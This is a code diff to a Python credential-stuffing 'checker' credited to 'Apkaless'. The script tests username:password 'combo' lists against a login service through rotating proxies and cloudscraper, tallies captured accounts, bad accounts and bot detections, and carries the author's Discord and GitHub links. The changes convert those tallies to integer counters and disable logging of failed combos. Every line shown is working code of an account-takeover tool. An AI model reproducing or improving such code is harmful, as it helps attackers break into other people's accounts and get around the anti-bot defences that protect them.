@@ -25,15 +25,16 @@ lib = Fore.LIGHTBLACK_EX
 res = Fore.RESET
 
 current_combo = []
-errors = []
+errors = 0
 good_proxies = []
 proxies = []
-captured_combos = []
-bad_accounts = []
-bots_detection = []
+captured_combos = 0
+bad_accounts = 0
+bots_detection = 0
 total_combos = []
 date = str(datetime.datetime.now()).split(' ')[0].strip()
 loop = False
+
 
 
 def write_records(hit: bool, bad: bool, combo_to_record: str):
@@ -43,7 +44,7 @@ def write_records(hit: bool, bad: bool, combo_to_record: str):
     ┌────────────────Owner Info────────────────┓
     ┧ Checker Coded By Apkaless
     ┧ Instagram ➞ Apkaless
-    ┧ Discord ➞ https://discord.gg/uj8AEUcQ5J
+    ┧ Discord ➞ https://discord.gg/MWqhbwTmbt
     ┧ Github ➞ https://github.com/apkaless
     ┧
     ┧────────────────Login Info────────────────┧
@@ -133,7 +134,7 @@ def set_proxy_to_dict(ip_port):
 
 
 def checker(comboList, proxies_list):
-    global errors, rem, jsdata, publickey_mod, publickey_exp
+    global errors, rem, jsdata, publickey_mod, publickey_exp, captured_combos, bad_accounts
     for i in proxies_list:
         proxies.append(i)
     s = cloudscraper.create_scraper(debug=False)
@@ -184,7 +185,7 @@ def checker(comboList, proxies_list):
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ReadTimeout, requests.exceptions.SSLError):
                 current_combo.clear()
                 current_combo.append(combo)
-                errors.append(proxy)
+                errors += 1
                 continue
             good_proxies.append(proxy)
             try:
@@ -214,14 +215,14 @@ def checker(comboList, proxies_list):
             except (requests.exceptions.ProxyError, requests.exceptions.ReadTimeout, requests.exceptions.SSLError) as e:
                 current_combo.clear()
                 current_combo.append(combo)
-                errors.append(proxy)
+                errors += 1
                 continue
             try:
                 jsdata = response.json()
             except Exception as e:
                 current_combo.clear()
                 current_combo.append(combo)
-                errors.append(proxy)
+                errors += 1
                 continue
 
             try:
@@ -231,12 +232,12 @@ def checker(comboList, proxies_list):
                         current_combo.clear()
                         good_proxies.append(proxy)
                         break
-                    bad_accounts.append(combo)
+                    bad_accounts += 1
                     rem -= 1
                     current_combo.clear()
                     good_proxies.append(proxy)
                     total_combos.append(combo)
-                    write_records(hit=False, bad=True, combo_to_record=combo)
+                    # write_records(hit=False, bad=True, combo_to_record=combo)
                     try:
                         comboList.remove(combo)
                     except Exception as e:
@@ -256,7 +257,7 @@ def checker(comboList, proxies_list):
                         good_proxies.append(proxy)
                         break
 
-                    captured_combos.append(combo)
+                    captured_combos += 1
                     total_combos.append(combo)
                     comboList.remove(combo)
                     current_combo.clear()
@@ -268,12 +269,12 @@ def checker(comboList, proxies_list):
                         current_combo.clear()
                         good_proxies.append(proxy)
                         break
-                    bad_accounts.append(combo)
+                    bad_accounts += 1
                     rem -= 1
                     current_combo.clear()
                     good_proxies.append(proxy)
                     total_combos.append(combo)
-                    write_records(hit=False, bad=True, combo_to_record=combo)
+                    # write_records(hit=False, bad=True, combo_to_record=combo)
                     try:
                         comboList.remove(combo)
                     except Exception as e:
@@ -285,7 +286,7 @@ def checker(comboList, proxies_list):
                     current_combo.clear()
                     current_combo.append(combo)
                     good_proxies.clear()
-                    errors.append(proxy)
+                    errors+= 1
                 except Exception as e:
                     pass
 
@@ -325,7 +326,7 @@ if __name__ == '__main__':
     try:
         while rem > 0:
 
-            display_info(len(captured_combos), len(bad_accounts), len(errors), total, len(bots_detection), rem)
+            display_info(captured_combos, bad_accounts, errors, total, bots_detection, rem)
 
             for i in range(1):
                 try:
